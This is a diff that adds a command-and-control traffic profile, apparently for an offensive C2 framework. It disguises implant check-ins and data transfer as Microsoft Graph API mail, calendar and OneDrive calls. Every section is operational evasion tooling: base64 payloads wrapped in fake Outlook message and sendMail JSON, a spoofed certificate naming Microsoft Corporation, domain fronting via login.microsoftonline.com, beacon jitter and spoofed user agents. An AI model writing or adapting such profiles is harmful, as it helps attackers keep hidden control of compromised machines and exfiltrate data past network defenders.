@@ -1,0 +1,73 @@
+# microsoft-graph.yaml — Microsoft Graph API masquerade
+# C2 traffic blends with legitimate M365 Graph API calls.
+# GET requests read "mail/calendar"; POST requests "send mail".
+
+name: microsoft-graph
+description: Masquerade as Microsoft Graph API traffic
+
+http-get:
+  uri:
+    - /v1.0/me/messages
+    - /v1.0/me/mailFolders/inbox/messages
+    - /v1.0/me/events
+    - /v1.0/me/drive/root/children
+    - /v1.0/me/contacts
+    - /beta/me/outlook/masterCategories
+  headers:
+    Host: graph.microsoft.com
+    Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1jN2wzSXo5M{{RAND}}{{AGENT_ID}}"
+    Content-Type: application/json
+    Accept: application/json
+    ConsistencyLevel: eventual
+    Prefer: outlook.body-content-type="text"
+    client-request-id: "{{RAND}}"
+    x-ms-client-request-id: "{{RAND}}"
+    SdkVersion: graph-python/1.4.0
+  body:
+    # Payload wrapped in a Graph API OData response
+    prepend: '{"@odata.context":"https://graph.microsoft.com/v1.0/$metadata#users(''me'')/messages","@odata.count":1,"value":[{"id":"AAMkAGI2T","subject":"Re: Q3 Planning","body":{"contentType":"text","content":"'
+    append: '"},"isRead":true}]}'
+    transform: base64
+
+http-post:
+  uri:
+    - /v1.0/me/sendMail
+    - /v1.0/me/messages
+    - /v1.0/me/events
+    - /v1.0/me/drive/root:/Documents/report.xlsx:/content
+  headers:
+    Host: graph.microsoft.com
+    Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1jN2wzSXo5M{{RAND}}{{AGENT_ID}}"
+    Content-Type: application/json
+    Accept: application/json
+    Prefer: IdType="ImmutableId"
+    client-request-id: "{{RAND}}"
+    x-ms-client-request-id: "{{RAND}}"
+    SdkVersion: graph-python/1.4.0
+  body:
+    # Payload wrapped as a Graph sendMail request
+    prepend: '{"message":{"subject":"Weekly Report","body":{"contentType":"Text","content":"'
+    append: '"},"toRecipients":[{"emailAddress":{"address":"team@contoso.com"}}]},"saveToSentItems":"true"}'
+    transform: base64
+
+https-certificate:
+  CN: "graph.microsoft.com"
+  O: "Microsoft Corporation"
+
+host-rotation:
+  strategy: random
+  hosts:
+    - graph.microsoft.com
+    - graph.microsoft.us
+  domain-fronting:
+    sni: login.microsoftonline.com
+    host: graph.microsoft.com
+
+sleep:
+  default: 60
+  jitter: 20
+
+user-agent:
+  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
+  - "ISV|CompanyName|AppName/1.0"
+  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
